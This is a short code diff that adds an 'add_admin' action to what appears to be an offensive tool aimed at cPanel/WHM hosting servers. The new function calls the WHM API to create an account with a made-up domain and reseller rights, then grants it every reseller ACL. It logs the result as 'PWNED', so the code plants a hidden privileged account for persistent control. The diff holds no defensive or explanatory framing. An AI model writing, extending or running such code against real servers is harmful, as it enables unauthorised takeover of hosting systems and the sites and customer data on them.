@@ -582,6 +582,25 @@ def action_read_file(ctx, path: str):
     safe_print(json.dumps(data, indent=2)[:1500] if isinstance(data, dict)
                else str(data)[:1500])
 
+def action_add_admin(ctx, username: str, passwd: str):
+    """Create new account and grant reseller/root-like permissions"""
+    domain = f"{username}.com"
+    log("API", f"Adding admin account: {username}")
+    s, data = whm_api(*ctx[:6], "createacct", {
+        "username": username,
+        "domain":   domain,
+        "password": passwd,
+        "plan":     "default",
+        "reseller": 1
+    }, ctx[6])
+    
+    if s == 200:
+        log("OK", f"User {username} created. Granting full ACLs...")
+        whm_api(*ctx[:6], "setreselleracl", {"user": username, "all": 1}, ctx[6])
+        log("PWNED", f"Admin {username} added with full permissions!")
+    else:
+        log("ERR", f"Failed to create user: {data}")
+
 def action_create_user(ctx, username: str, domain: str, passwd: str):
     """Create new cPanel account"""
     log("API", f"Creating account: {username} / {domain}")
